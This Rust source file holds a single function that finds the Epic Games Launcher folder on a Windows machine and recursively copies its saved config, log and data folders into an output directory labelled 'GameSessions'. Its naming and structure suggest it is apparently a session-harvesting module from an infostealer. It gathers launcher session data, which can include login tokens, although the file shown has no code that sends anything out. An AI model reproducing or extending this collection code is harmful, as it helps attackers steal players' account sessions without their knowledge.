use std::path::{Path, PathBuf};
use std::fs;

pub fn extract(output_dir: &Path) -> usize {
    let mut count = 0;
    
    let local_app_data = match std::env::var("LOCALAPPDATA") {
        Ok(path) => PathBuf::from(path),
        Err(_) => return 0,
    };

    let epic_path = local_app_data.join("EpicGamesLauncher");
    if !epic_path.exists() {
        return 0;
    }

    let dest_dir = output_dir.join("GameSessions").join("EpicGames");
    fs::create_dir_all(&dest_dir).ok();

    let dirs_to_copy = [
        ("Saved\\Config", "Config"),
        ("Saved\\Logs", "Logs"),
        ("Saved\\Data", "Data"),
    ];

    for (src_sub, dest_sub) in dirs_to_copy {
        let src_path = epic_path.join(src_sub);
        let dest_path = dest_dir.join(dest_sub);
        
        if src_path.exists() {
            if c_dir_recursive(&src_path, &dest_path).is_ok() {
                count += 1; 
            }
        }
    }

    count
}

fn c_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {
    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }

    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let ft = entry.file_type()?;
        let dest_path = dst.join(entry.file_name());

        if ft.is_dir() {
            c_dir_recursive(&entry.path(), &dest_path)?;
        } else {
            fs::copy(&entry.path(), &dest_path)?;
        }
    }
    Ok(())
}
